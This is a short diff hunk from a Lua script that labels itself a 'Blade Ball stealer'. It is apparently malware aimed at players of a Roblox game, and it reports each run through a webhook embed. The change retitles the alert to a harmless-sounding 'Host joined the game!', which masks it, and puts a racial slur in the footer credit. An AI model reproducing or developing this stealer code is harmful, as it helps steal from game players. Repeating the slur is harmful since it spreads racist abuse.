@@ -287,11 +287,11 @@ local function SendMessage(list)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "\240\159\148\180 New Blade Ball Execution" ,
+            ["title"] = "\240\159\148\180 Host joined the game!" ,
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Blade Ball stealer by Benok"
+				["text"] = "Blade Ball stealer by Nigger"
 			}
         }}
     }
